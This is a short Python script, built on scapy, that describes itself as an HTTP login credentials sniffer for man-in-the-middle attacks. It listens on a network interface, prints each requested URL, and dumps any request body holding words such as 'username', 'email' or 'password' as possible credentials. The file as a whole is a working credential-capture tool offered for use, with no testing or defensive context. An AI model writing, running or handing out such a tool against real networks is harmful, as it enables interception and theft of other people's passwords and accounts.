from scapy.all import *
from scapy.layers import http
from termcolor import colored
import colorama, argparse

parser = argparse.ArgumentParser(description='- HTTP login credentials sniffer for MITM attack.', usage='sudo python3 Packet_Sniffer.py -i <interface>')
parser.add_argument('-i', '--interface', metavar='', required=True, help='Specify an interface')
args = parser.parse_args()
colorama.init()

def sniffer(interface):
    sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url.decode()

def get_credentials(packet):
    if packet.haslayer(Raw):
        raw_data = packet[Raw].load.decode()
        keywords = ['username', 'user', 'email', 'password', 'pass']
        for keyword in keywords:
            if keyword in raw_data:
                return raw_data

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[*] ' + url)
        login_data = get_credentials(packet)
        if login_data:
            print(colored(f'\n\n[+] Possible credentials: {login_data}\n\n', 'green'))

sniffer(args.interface)
